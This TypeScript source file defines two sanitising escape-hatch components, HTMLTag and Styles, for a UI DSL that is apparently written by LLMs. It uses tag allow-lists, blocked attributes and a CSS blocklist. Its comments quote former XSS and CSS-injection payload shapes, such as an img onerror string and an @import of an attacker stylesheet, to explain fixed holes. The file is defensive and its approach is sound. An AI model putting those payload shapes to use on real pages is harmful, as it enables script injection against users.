/**
 * Escape-hatch components — `HTMLTag` renders an arbitrary allow-listed HTML
 * tag (with attributes and children), and `Styles` renders a scoped
 * `<style>` block. Both exist for the rare case where the standard
 * component catalogue cannot express what the author needs (custom layout,
 * embedded SVG, third-party widget container, etc.).
 *
 * Both components run aggressive sanitisation so an LLM-supplied tag name,
 * attribute, or stylesheet cannot smuggle script execution into the page.
 */

import type { ComponentSpec } from "../types.js";
import {
  asArray, asString, sanitiseHref, sanitiseImageSrc,
} from "../utils.js";

/**
 * Tags `HTMLTag` will render. Anything outside this set falls back to a
 * `<div>` so a hostile / typo'd LLM response never lands a `<script>` or
 * top-level document tag in the DOM. The list is intentionally broad —
 * structural, text, table, media, and form primitives — so authors can
 * compose almost anything HTML supports without raw `innerHTML` access.
 *
 * SVG / MathML are intentionally excluded: their namespaces require a
 * different `createElement` path. Authors who need vector graphics
 * should reach for `Svg` / `Icon` / `Image` instead.
 */
const ALLOWED_TAGS = new Set<string>([
  "div", "span", "p", "section", "article", "header", "footer", "main",
  "nav", "aside", "figure", "figcaption", "details", "summary",
  "h1", "h2", "h3", "h4", "h5", "h6",
  "ul", "ol", "li", "dl", "dt", "dd",
  "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption",
  "colgroup", "col",
  "a", "img", "picture", "source", "video", "audio", "track",
  "small", "strong", "em", "b", "i", "u", "s", "mark", "code", "pre",
  "kbd", "samp", "var", "sub", "sup", "abbr", "cite", "blockquote", "q",
  "time", "address", "ins", "del", "ruby", "rt", "rp", "bdi", "bdo",
  "br", "hr", "wbr", "hgroup",
  "label", "fieldset", "legend", "progress", "meter", "output",
]);

/**
 * Attribute name matcher. Accepts standard HTML attributes plus
 * `data-*` / `aria-*`. Forbids `on*` event handlers and any name that
 * contains characters which could break out of the attribute boundary.
 */
const ATTR_NAME_RE = /^[a-zA-Z][a-zA-Z0-9_:-]*$/;

/**
 * Attribute names that may carry URL-shaped values. We funnel them through
 * `sanitiseHref` / `sanitiseImageSrc` so a `javascript:` payload from an
 * LLM response can never land on a clickable / loadable surface.
 */
const URL_ATTRS_HREF = new Set(["href", "ping", "action", "formaction"]);
const URL_ATTRS_SRC = new Set(["src", "poster"]);

/**
 * Attributes dropped outright because they take a URL (or URL list) that no
 * chokepoint here validates, or because they change how the browser interprets
 * the element. `srcset` / `imagesrcset` are comma-separated URL lists, so they
 * need per-candidate parsing rather than a single-URL sanitiser; until that
 * exists they are dropped.
 *
 * The `html` family is the important one: the attribute *names* here come from
 * the DSL, so any helper that gives a name an implicit "assign this as markup"
 * meaning turns this component into an XSS sink. `el()` used to treat a key
 * named `html` as `innerHTML = value`, which made
 * `HTMLTag("div", { attributes: { html: "<img src=x onerror=…>" } })` execute.
 * The render path below no longer goes through `el()`, and these names are
 * dropped as well so the hole cannot be reopened from the other side.
 */
const BLOCKED_ATTRS = new Set([
  "srcset", "imagesrcset", "srcdoc", "data", "background", "manifest", "http-equiv",
  "html", "innerhtml", "outerhtml", "textcontent",
  // Custom-element upgrade: `is` asks the browser to construct a
  // *different*, host-defined element than the tag we allow-listed.
  "is",
]);

/**
 * Inline `style` attribute sanitiser. Mirrors the rules used by `Text`'s
 * `style` prop — block angle brackets, `expression()`, `javascript:`,
 * `behavior:`, and `@import`. Returns the empty string when the value is
 * rejected so the caller can drop the attribute entirely.
 */
function sanitiseInlineStyleAttr(value: unknown): string {
  const raw = asString(value).trim();
  if (!raw) return "";
  if (/[<>]/.test(raw)) return "";
  if (/\bexpression\s*\(|\bjavascript\s*:|\bbehavior\s*:|@import\b/i.test(raw)) return "";
  return raw;
}

/** Tag names already reported by `resolveTagName`, so a list render warns once. */
const warnedTags = new Set<string>();

/**
 * Coerce a tag name into a safe lower-case token. Falls back to `div` for
 * anything outside the allow-list so the rendered DOM is always
 * predictable.
 *
 * The fallback is announced: collapsing `HTMLTag("svg", …)` to an empty `<div>`
 * silently is indistinguishable from a styling bug, and the validator cannot
 * catch it (the prop is a free-form string).
 */
function resolveTagName(input: unknown): string {
  const name = asString(input).trim().toLowerCase();
  if (!name) return "div";
  if (!ALLOWED_TAGS.has(name)) {
    if (!warnedTags.has(name)) {
      warnedTags.add(name);
      console.warn(
        `[aktion] HTMLTag: tag "${name}" is not in the allow-list — rendered as <div>. ` +
        "For vector graphics use `Svg` or `Icon`.",
      );
    }
    return "div";
  }
  return name;
}

/**
 * Build the attribute object the DOM should receive. Values are normalised to
 * strings so the render path can apply each one with a bare `setAttribute` —
 * no helper, no key with an implicit meaning, and no "boolean attribute"
 * coercion path that would let a `false` value land as the literal `"false"`.
 */
function buildAttrs(input: unknown): Record<string, string> {
  if (!input || typeof input !== "object" || Array.isArray(input)) return {};
  const out: Record<string, string> = {};
  for (const [rawKey, rawValue] of Object.entries(input as Record<string, unknown>)) {
    const key = rawKey.trim();
    if (!key) continue;
    if (!ATTR_NAME_RE.test(key)) continue;
    const lower = key.toLowerCase();
    if (lower.startsWith("on")) continue;
    if (rawValue === null || rawValue === undefined || rawValue === false) continue;
    // `ATTR_NAME_RE` permits a namespace prefix, so the URL look-ups have to
    // match on the local name — otherwise `xlink:href` skips `sanitiseHref`.
    const local = lower.includes(":") ? lower.slice(lower.lastIndexOf(":") + 1) : lower;

    if (local === "style") {
      const style = sanitiseInlineStyleAttr(rawValue);
      if (style) out.style = style;
      continue;
    }
    if (URL_ATTRS_HREF.has(local)) {
      const safe = sanitiseHref(rawValue, "");
      if (safe) out[key] = safe;
      continue;
    }
    if (URL_ATTRS_SRC.has(local)) {
      const safe = sanitiseImageSrc(rawValue);
      if (safe) out[key] = safe;
      continue;
    }
    if (BLOCKED_ATTRS.has(lower) || BLOCKED_ATTRS.has(local)) continue;
    out[key] = rawValue === true ? "" : asString(rawValue);
  }
  // Reverse tabnabbing: a `target="_blank"` anchor without `rel="noopener"`
  // hands the opened page a live `window.opener` reference to this document,
  // letting it navigate the host app to a phishing origin. Flagged by CodeQL
  // (`js/window-opener`) and SonarQube as well as being a genuine risk, so the
  // `rel` is forced rather than merely defaulted.
  const target = out.target ?? out.Target;
  if (target && target !== "_self" && target !== "_parent" && target !== "_top") {
    const rel = (out.rel ?? "").split(/\s+/).filter(Boolean);
    if (!rel.includes("noopener")) rel.push("noopener");
    if (!rel.includes("noreferrer")) rel.push("noreferrer");
    out.rel = rel.join(" ");
  }
  return out;
}

export const HTMLTag: ComponentSpec = {
  name: "HTMLTag",
  description:
    "Escape-hatch primitive that renders an allow-listed HTML tag with " +
    "the given attributes and children. Use ONLY when the standard " +
    "component catalogue cannot express the markup (custom semantic " +
    "elements, third-party widget mounts). SVG is NOT supported here — use " +
    "`Svg` for vector markup and `Icon` for glyphs. Tag names outside the " +
    "allow-list collapse to `div` (with a console warning). Attribute names " +
    "matching `on*` (event handlers) are dropped, `href`/`src` are sanitised, " +
    "`srcset`/`srcdoc` are dropped, and `style` is filtered for " +
    "`expression()` / `javascript:` / `@import`. Pass children as an array of " +
    "components — strings render as text nodes.",
  props: [
    { name: "tag", type: "string", positional: true, required: true, description: "HTML tag name (e.g. \"div\", \"section\", \"figure\"). Falls back to `div` when outside the allow-list — SVG tags are not accepted, use `Svg`." },
    { name: "attributes", type: "object", optional: true, aliases: ["attrs", "props"], description: "Plain object of attribute name → value pairs (e.g. `{ class: \"hero\", \"data-id\": 1 }`). `on*` handlers are dropped." },
    { name: "children", aliases: ["child"], type: "Node[]", optional: true, description: "Child components or text nodes to render inside the tag." },
  ],
  render: (_node, props, helpers) => {
    const tag = resolveTagName(props.tag);
    const attrs = buildAttrs(props.attributes);
    // Deliberately NOT `el()`: the attribute *keys* here are DSL-supplied, so
    // routing them through a helper that gives any key a special meaning (as
    // `el` once did for `html` → `innerHTML`) is an injection sink by
    // construction. A bare `setAttribute` per vetted key has no such surface.
    const root = document.createElement(tag);
    for (const [key, value] of Object.entries(attrs)) root.setAttribute(key, value);
    for (const child of asArray<unknown>(props.children)) {
      if (child === null || child === undefined) continue;
      if (typeof child === "string") {
        root.append(document.createTextNode(child));
        continue;
      }
      if (typeof child === "number" || typeof child === "boolean") {
        root.append(document.createTextNode(String(child)));
        continue;
      }
      root.append(helpers.renderNode(child));
    }
    return root;
  },
};

/**
 * Strip CSS payloads that would break out of a `<style>` element or
 * execute script in legacy browsers. We do not parse the stylesheet —
 * that would balloon the runtime — so the rules below are a defensive
 * subset:
 *
 *  - Reject anything containing `</style` so a malicious payload cannot
 *    close the tag and inject HTML/JS afterwards.
 *  - Reject `expression(`, `javascript:`, `behavior:`, `@import`, and
 *    `<script` so common XSS shapes never reach the DOM.
 *  - Drop the value when it exceeds a generous safety cap so a runaway
 *    paste cannot block the render thread.
 */
const STYLES_BLOCK_RE = /<\/style|<script|expression\s*\(|javascript\s*:|behavior\s*:|@import\b/i;
const STYLES_MAX_LENGTH = 64 * 1024;

function sanitiseStyleSheet(input: unknown): string {
  const raw = asString(input);
  if (!raw) return "";
  // Every rejection is announced. A silently empty `<style>` is
  // indistinguishable from a typo'd selector, so an author whose sheet trips
  // the blocklist has no way to find out why nothing is styled.
  if (raw.length > STYLES_MAX_LENGTH) {
    console.warn(
      `[aktion] Styles: payload rejected — ${raw.length} characters exceeds the ` +
      `${STYLES_MAX_LENGTH}-character cap.`,
    );
    return "";
  }
  if (STYLES_BLOCK_RE.test(raw)) {
    console.warn(
      "[aktion] Styles: payload rejected — it contains one of `</style`, `<script`, " +
      "`expression(`, `javascript:`, `behavior:` or `@import`.",
    );
    return "";
  }
  return raw;
}

/**
 * Selector shape the `scope` prop accepts: plain type/class/id compounds joined
 * by descendant / child / sibling combinators.
 *
 * `scope` is concatenated into the generated stylesheet, so it is a sink in its
 * own right — it used to skip `sanitiseStyleSheet` entirely, which made
 * `scope: "@import url(//attacker/x.css);.b"` emit a leading, honoured
 * `@import` inside the `<style>` element and defeat the component's own
 * documented policy. A shape whitelist (rather than another blocklist) is what
 * makes that unreachable: nothing matching this can carry a `{`, `@`, quote, or
 * parenthesis.
 */
const SCOPE_SELECTOR_RE = /^[.#]?[A-Za-z_][\w-]*(?:\s*[>+~]?\s*[.#]?[A-Za-z_][\w-]*)*$/;
const SCOPE_MAX_LENGTH = 128;

/**
 * Validate the `scope` prop. Returns the selector, `""` when no scope was
 * requested, or `null` when the value was rejected (the caller then drops the
 * whole sheet — an unscoped sheet would leak every rule to the shadow root,
 * which is the opposite of what the author asked for).
 */
function sanitiseScopeSelector(input: unknown): string | null {
  const raw = asString(input).trim();
  if (!raw) return "";
  if (raw.length > SCOPE_MAX_LENGTH) return null;
  if (STYLES_BLOCK_RE.test(raw)) return null;
  if (!SCOPE_SELECTOR_RE.test(raw)) return null;
  return raw;
}

/**
 * Token interpolation (I.6): replace `{group.key}` placeholders in CSS with
 * the matching `var(--rui-*)`, so `padding: {spacing.l}` → `var(--rui-spacing-l)`.
 * Unknown shapes are left untouched.
 */
function interpolateTokens(css: string): string {
  return css.replace(/\{\s*([a-zA-Z]+)\.([a-zA-Z0-9-]+)\s*\}/g, (whole, group: string, rawKey: string) => {
    const key = rawKey.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
    const prefix = group === "colors" || group === "color" ? "color"
      : group === "spacing" ? "spacing"
      : group === "radius" ? "radius"
      : group === "shadows" || group === "shadow" ? "shadow"
      : group === "gradients" || group === "gradient" ? "gradient"
      : group === "font" || group === "fonts" ? "font"
      : null;
    if (!prefix) return whole;
    return `var(--rui-${prefix}-${key})`;
  });
}

/**
 * At-rules whose body is a nested *rule list*, so scoping has to recurse into
 * them. Passing `@container`/`@layer`/`@scope` through unscoped leaked their
 * inner rules to the whole shadow root — the exact opposite of what `scope`
 * promises, and container queries are the standard tool for the
 * component-local layout this escape hatch exists to enable.
 *
 * Anything else (`@keyframes`, `@font-face`, `@property`, `@counter-style`, …)
 * has a declaration body that a selector prefix would corrupt, so it is passed
 * through verbatim. Unknown at-rules default to pass-through for the same
 * reason.
 */
const NESTED_AT_RULES = new Set([
  "@media", "@supports", "@container", "@layer", "@scope", "@document",
]);

/**
 * Split a selector list on top-level commas only.
 *
 * A naive `split(",")` tears any functional pseudo-class apart —
 * `.row:is(.odd, .even)` became `.t .row:is(.odd` + `.t .even)`, an invalid
 * `:is()` argument, so the browser dropped the whole rule and the author got
 * silent no-op styling. `:where()`, `:not(a, b)`, `:has(x, y)` and
 * `[data-x=","]` are all ordinary modern CSS with the same shape.
 */
function splitSelectorList(prelude: string): string[] {
  const out: string[] = [];
  let depth = 0;
  let quote = "";
  let start = 0;
  for (let i = 0; i < prelude.length; i += 1) {
    const ch = prelude[i];
    if (quote) {
      if (ch === "\\") { i += 1; continue; }
      if (ch === quote) quote = "";
      continue;
    }
    if (ch === "\"" || ch === "'") { quote = ch; continue; }
    if (ch === "(" || ch === "[") { depth += 1; continue; }
    if ((ch === ")" || ch === "]") && depth > 0) { depth -= 1; continue; }
    if (ch === "," && depth === 0) {
      out.push(prelude.slice(start, i));
      start = i + 1;
    }
  }
  out.push(prelude.slice(start));
  return out;
}

/**
 * Rewrite one selector so it only matches inside `scopeSel`.
 *
 * The descendant prefix is not always right: `Styles(".widget { … }", scope:
 * ".widget")` — the most natural call there is — produced `.widget .widget`,
 * which matches nothing. A rule that targets the scope element *itself* (bare,
 * or compounded with a pseudo-class/class/id/attribute), or that uses the
 * nesting `&`, becomes the scope selector instead of a descendant of it.
 */
function scopeSelector(sel: string, scopeSel: string): string {
  const s = sel.trim();
  if (!s) return s;
  // `:root` and the shadow-host pseudos address elements *above* the scope
  // element, so a descendant prefix makes them permanently unmatchable —
  // and `:host` is the idiomatic place to declare custom properties inside a
  // shadow root.
  if (s.startsWith(":root") || s.startsWith(":host")) return s;
  // Explicit author reference to the scope element.
  if (s.startsWith("&")) return `${scopeSel}${s.slice(1)}`;
  if (s === scopeSel) return s;
  if (s.startsWith(scopeSel)) {
    const next = s.charAt(scopeSel.length);
    if (next === ":" || next === "." || next === "#" || next === "[") return s;
  }
  return `${scopeSel} ${s}`;
}

/**
 * Lightweight CSS scoping (I.6): prefix every top-level rule selector with
 * `scopeSel` so the rules only apply inside that wrapper. Grouping at-rules
 * (`@media`/`@supports`/`@container`/`@layer`/`@scope`) are recursed into;
 * `@keyframes`/`@font-face` and friends are left untouched. This is a heuristic
 * (no full CSS parse) that handles the flat-rule common case authors reach for.
 */
function scopeCss(css: string, scopeSel: string): string {
  const out: string[] = [];
  let i = 0;
  const n = css.length;
  while (i < n) {
    const brace = css.indexOf("{", i);
    if (brace === -1) { out.push(css.slice(i)); break; }
    const prelude = css.slice(i, brace).trim();
    // Find matching close brace.
    let depth = 1; let j = brace + 1;
    for (; j < n && depth > 0; j += 1) {
      if (css[j] === "{") depth += 1;
      else if (css[j] === "}") depth -= 1;
    }
    // On an unbalanced sheet the loop runs off the end with `j === n`, so
    // `j - 1` would clip the last character of the final declaration
    // (`.a { color: red` → `color: re`). Take the whole remainder instead and
    // let the emitted rule supply the missing brace.
    const body = depth === 0 ? css.slice(brace + 1, j - 1) : css.slice(brace + 1, n);
    const atRule = /^@[-a-zA-Z]+/.exec(prelude)?.[0]?.toLowerCase();
    if (atRule && NESTED_AT_RULES.has(atRule)) {
      out.push(`${prelude} { ${scopeCss(body, scopeSel)} }`);
    } else if (atRule) {
      out.push(`${prelude} { ${body} }`); // keyframes / font-face / property etc.
    } else {
      const scoped = splitSelectorList(prelude)
        .map((sel) => scopeSelector(sel, scopeSel))
        .join(", ");
      out.push(`${scoped} { ${body} }`);
    }
    i = j;
  }
  return out.join("\n");
}

export const Styles: ComponentSpec = {
  name: "Styles",
  description:
    "Escape-hatch primitive that injects a `<style>` block containing the " +
    "given CSS rules. Use ONLY when a layout cannot be expressed via " +
    "component props or the `$theme(...)` token map. The CSS is rendered " +
    "verbatim into the document so authors can target their own " +
    "`HTMLTag` markup or scope rules to a wrapper class. Payloads " +
    "containing `</style>`, `<script>`, `expression(`, `javascript:`, " +
    "`behavior:`, or `@import` are dropped for safety — as is a `scope` that " +
    "is not a plain selector. Every rejection is logged with `console.warn`, " +
    "so an empty `<style>` is always explained.",
  props: [
    { name: "css", type: "string", positional: true, required: true, aliases: ["content", "rules"], description: "Raw CSS text (e.g. `\".hero { color: red; }\"`)." },
    { name: "scope", type: "string", optional: true, description: "Selector to scope every rule under, e.g. `\".my-widget\"` (I.6). Must be a plain class/id/tag selector — anything else drops the sheet." },
    { name: "tokens", type: "boolean", optional: true, description: "Interpolate `{group.key}` token refs to CSS vars (default true)" },
  ],
  render: (_node, props) => {
    let css = sanitiseStyleSheet(props.css);
    if (css && (props.tokens === undefined || props.tokens === true || props.tokens === "true")) {
      css = interpolateTokens(css);
    }
    // `scope` is concatenated into the sheet, so it goes through the same gate
    // as `css`. On rejection the whole sheet is dropped rather than emitted
    // unscoped: the author asked for rules confined to a wrapper, and leaking
    // them to the entire shadow root is not a safe fallback.
    const scope = sanitiseScopeSelector(props.scope);
    if (scope === null) {
      console.warn(
        `[aktion] Styles: scope="${asString(props.scope)}" is not a plain selector ` +
        "(class/id/tag with combinators) — the stylesheet was dropped.",
      );
      css = "";
    } else if (css && scope) {
      css = scopeCss(css, scope);
    }
    const node = document.createElement("style");
    node.setAttribute("class", "rui-styles");
    if (css) node.textContent = css;
    return node;
  },
};
